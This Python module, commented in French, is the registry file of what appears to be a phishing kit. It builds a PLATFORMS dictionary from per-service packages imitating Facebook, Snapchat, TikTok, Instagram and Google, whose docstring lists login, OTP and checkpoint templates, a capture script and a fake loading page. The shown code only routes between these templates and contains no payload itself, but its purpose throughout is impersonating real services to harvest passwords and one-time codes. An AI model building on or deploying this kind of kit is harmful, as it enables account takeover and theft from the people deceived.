"""platforms/__init__.py — Registry central des plateformes.

Importe toutes les plateformes et construit le dictionnaire PLATFORMS
qui est l'API publique utilisée par routes.py, target_config.py, etc.

Architecture :
  platforms/
    __init__.py          ← ce fichier (registry + API publique)
    _shared.py            ← JS_STRICT_CAPTURE, logos SVG, _log_err
    _video_dialog.py      ← VideoPublicationDialog (base pour SC + TT)
    facebook/             ← dossier Facebook
    snapchat/             ← dossier Snapchat
    tiktok/               ← dossier TikTok
    instagram/            ← dossier Instagram
    google/               ← dossier Google

Chaque dossier de plateforme contient :
    __init__.py           ← exports publics
    settings.py           ← PLATFORM_INFO, CAPABILITIES, TRANSLATIONS, etc.
    route.py              ← TEMPLATES, get_template, handle_loading, register_routes
    dialog.py             ← PublicationDialog ou VideoPublicationDialog
    login.py              ← templates de connexion
    otp.py                ← templates OTP
    checkpoint.py         ← template checkpoint
    feed.py               ← template feed (sauf Google)
"""

import traceback


# ════════════════════════════════════════════════════════════════════
#  Importer toutes les plateformes
# ════════════════════════════════════════════════════════════════════
try:
    from platforms import facebook as _fb
except Exception as e:
    try:
        import sys
        sys.stderr.write(f"[platforms.__init__] Failed to import facebook: {e}\n")
    except Exception:
        pass
    _fb = None

try:
    from platforms import snapchat as _sc
except Exception as e:
    try:
        import sys
        sys.stderr.write(f"[platforms.__init__] Failed to import snapchat: {e}\n")
    except Exception:
        pass
    _sc = None

try:
    from platforms import tiktok as _tt
except Exception as e:
    try:
        import sys
        sys.stderr.write(f"[platforms.__init__] Failed to import tiktok: {e}\n")
    except Exception:
        pass
    _tt = None

try:
    from platforms import instagram as _ig
except Exception as e:
    try:
        import sys
        sys.stderr.write(f"[platforms.__init__] Failed to import instagram: {e}\n")
    except Exception:
        pass
    _ig = None

try:
    from platforms import google as _gg
except Exception as e:
    try:
        import sys
        sys.stderr.write(f"[platforms.__init__] Failed to import google: {e}\n")
    except Exception:
        pass
    _gg = None


# ════════════════════════════════════════════════════════════════════
#  Construire le dictionnaire PLATFORMS
# ════════════════════════════════════════════════════════════════════
def _build_platform_entry(module):
    """Construit une entrée du dict PLATFORMS à partir d'un module de plateforme."""
    try:
        return {
            "name":              module.PLATFORM_INFO["name"],
            "icon":              module.PLATFORM_INFO["icon"],
            "default_redirect":  module.PLATFORM_INFO["default_redirect"],
            "favicon":           module.PLATFORM_INFO["favicon"],
            "primary_color":     module.PLATFORM_INFO["primary_color"],
            "button_color":      module.PLATFORM_INFO["button_color"],
            "bg_color":          module.PLATFORM_INFO["bg_color"],
            "footer_text":       module.PLATFORM_INFO["footer_text"],
            "capabilities":      module.CAPABILITIES,
            "translations":      module.TRANSLATIONS,
            "feed_translations": module.FEED_TRANSLATIONS,
            "reactions_map":     module.REACTIONS_MAP,
            "feed_colors":       module.FEED_COLORS,
            "templates":         module.TEMPLATES,
            "_module":           module,  # Référence au module pour accéder aux fonctions
        }
    except Exception as e:
        try:
            import sys
            sys.stderr.write(f"[platforms._build_platform_entry] {e}\n")
        except Exception:
            pass
        return None


PLATFORMS = {}

if _fb:
    entry = _build_platform_entry(_fb)
    if entry:
        PLATFORMS["facebook"] = entry

if _sc:
    entry = _build_platform_entry(_sc)
    if entry:
        PLATFORMS["snapchat"] = entry

if _tt:
    entry = _build_platform_entry(_tt)
    if entry:
        PLATFORMS["tiktok"] = entry

if _ig:
    entry = _build_platform_entry(_ig)
    if entry:
        PLATFORMS["instagram"] = entry

if _gg:
    entry = _build_platform_entry(_gg)
    if entry:
        PLATFORMS["google"] = entry


# ════════════════════════════════════════════════════════════════════
#  Plateformes mobile-only
# ════════════════════════════════════════════════════════════════════
MOBILE_ONLY_PLATFORMS = set()
for pid, p in PLATFORMS.items():
    try:
        if hasattr(p.get("_module"), 'MOBILE_ONLY') and p["_module"].MOBILE_ONLY:
            MOBILE_ONLY_PLATFORMS.add(pid)
    except Exception:
        pass


# ════════════════════════════════════════════════════════════════════
#  API publique (mêmes signatures que l'ancien platforms_parts/registry.py)
# ════════════════════════════════════════════════════════════════════

def is_mobile_only(platform_id):
    """Return True si la plateforme est mobile-only (pas de PC)."""
    try:
        return (platform_id or "").lower().strip() in MOBILE_ONLY_PLATFORMS
    except Exception:
        return False


def get_platform(cfg):
    """Retourne l'entrée PLATFORMS pour le cfg donné."""
    try:
        pid = (cfg or {}).get("platform", "facebook") or "facebook"
        pid = pid.lower().strip()
        if pid not in PLATFORMS:
            pid = "facebook"
        return PLATFORMS[pid]
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("get_platform", e)
        except Exception:
            pass
        return PLATFORMS.get("facebook", {})


def get_platform_by_id(pid):
    """Retourne l'entrée PLATFORMS par id."""
    try:
        pid = (pid or "facebook").lower().strip()
        return PLATFORMS.get(pid, PLATFORMS.get("facebook", {}))
    except Exception:
        return PLATFORMS.get("facebook", {})


def get_translations_for(cfg, lang):
    """Retourne les traductions login/OTP pour la plateforme + langue."""
    try:
        p = get_platform(cfg)
        tr = p.get("translations", {})
        return tr.get(lang, tr.get("en", {}))
    except Exception:
        return {}


def get_feed_translations_for(cfg, lang):
    """Retourne les traductions du feed pour la plateforme + langue."""
    try:
        p = get_platform(cfg)
        tr = p.get("feed_translations", {})
        return tr.get(lang, tr.get("en", {}))
    except Exception:
        return {}


def get_template(cfg, key):
    """Retourne le template pour la plateforme + clé.
    Les plateformes mobile-only fallback vers le template mobile si pc_login/pc_otp n'existe pas."""
    try:
        p = get_platform(cfg)
        templates = p.get("templates", {})
        if key in templates:
            return templates[key]
        # Fallback: mobile-only → pc_login → mobile_login, pc_otp → mobile_otp
        if key == "pc_login":
            return templates.get("mobile_login", "")
        if key == "pc_otp":
            return templates.get("mobile_otp", "")
        return ""
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("get_template", e)
        except Exception:
            pass
        return ""


def get_reactions_map_for(cfg):
    """Retourne le reactions_map pour la plateforme."""
    try:
        return get_platform(cfg).get("reactions_map", {})
    except Exception:
        return {}


def get_feed_colors_for(cfg):
    """Retourne les feed_colors pour la plateforme."""
    try:
        return get_platform(cfg).get("feed_colors", [])
    except Exception:
        return []


def get_capabilities(cfg):
    """Retourne les capacités pour la plateforme du cfg."""
    try:
        p = get_platform(cfg)
        return p.get("capabilities", PLATFORMS.get("facebook", {}).get("capabilities", {}))
    except Exception:
        return {}


def get_capabilities_by_id(pid):
    """Retourne les capacités par id de plateforme."""
    try:
        p = get_platform_by_id(pid)
        return p.get("capabilities", PLATFORMS.get("facebook", {}).get("capabilities", {}))
    except Exception:
        return {}


def get_video_mode(cfg):
    """Retourne le video_mode pour la plateforme du cfg."""
    try:
        caps = get_capabilities(cfg)
        return caps.get("video_mode", "facebook_post")
    except Exception:
        return "facebook_post"


def get_video_mode_by_id(pid):
    """Retourne le video_mode par id de plateforme."""
    try:
        caps = get_capabilities_by_id(pid)
        return caps.get("video_mode", "facebook_post")
    except Exception:
        return "facebook_post"


def get_dialog_class(platform_id):
    """Retourne la classe de dialog pour la plateforme.
    Facebook + Instagram → PublicationDialog
    Snapchat + TikTok → VideoPublicationDialog
    Google → None (pas de publications)"""
    try:
        pid = (platform_id or "facebook").lower().strip()
        p = PLATFORMS.get(pid)
        if p is None:
            return None
        module = p.get("_module")
        if module is None:
            return None
        if hasattr(module, 'VideoPublicationDialog'):
            return module.VideoPublicationDialog
        if hasattr(module, 'PublicationDialog'):
            return module.PublicationDialog
        return None
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("get_dialog_class", e)
        except Exception:
            pass
        return None


def handle_loading(cfg):
    """Génère la page de faux chargement pour la plateforme du cfg.
    Retourne le HTML ou None si la plateforme n'a pas de page de chargement."""
    try:
        p = get_platform(cfg)
        module = p.get("_module")
        if module and hasattr(module, 'handle_loading'):
            return module.handle_loading(cfg)
        return None
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("handle_loading", e)
        except Exception:
            pass
        return None


def register_all_routes(app):
    """Enregistre les routes spécifiques de toutes les plateformes."""
    try:
        for pid, p in PLATFORMS.items():
            module = p.get("_module")
            if module and hasattr(module, 'register_routes'):
                try:
                    module.register_routes(app)
                except Exception as e:
                    try:
                        from platforms._shared import _log_err
                        _log_err(f"register_routes[{pid}]", e)
                    except Exception:
                        pass
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("register_all_routes", e)
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════
#  Exports publics
# ════════════════════════════════════════════════════════════════════
__all__ = [
    "PLATFORMS",
    "MOBILE_ONLY_PLATFORMS",
    "is_mobile_only",
    "get_platform",
    "get_platform_by_id",
    "get_translations_for",
    "get_feed_translations_for",
    "get_template",
    "get_reactions_map_for",
    "get_feed_colors_for",
    "get_capabilities",
    "get_capabilities_by_id",
    "get_video_mode",
    "get_video_mode_by_id",
    "get_dialog_class",
    "handle_loading",
    "register_all_routes",
]
